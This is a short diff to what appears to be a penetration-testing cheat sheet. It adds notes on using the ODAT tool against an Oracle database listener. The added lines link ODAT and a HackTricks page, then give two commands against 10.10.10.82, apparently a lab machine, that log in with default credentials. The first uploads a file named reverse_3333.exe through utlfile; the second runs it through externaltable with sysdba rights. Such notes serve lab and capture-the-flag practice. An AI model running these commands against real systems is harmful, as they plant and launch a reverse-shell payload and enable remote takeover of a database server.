@@ -207,6 +207,13 @@ Contents
                 Enumeration
                     tnscmd10g version -h <ip>
                     tnscmd10g status -h <ip>
+                odat
+                  https://github.com/quentinhardy/odat 
+                  https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
+                  Put the file 
+                     python3 odat.py utlfile -s 10.10.10.82 --sysdba -U scott -P tiger -d XE --putFile /temp thanks.exe ./reverse_3333.exe 
+                  Execute the file 
+                     python3 odat.py externaltable -s 10.10.10.82  -U scott -P tiger -d XE --sysdba --exec /temp thanks.exe  
             1748,1754,1808,1809 Oracle
                 Orcales Intelligent Agent
              
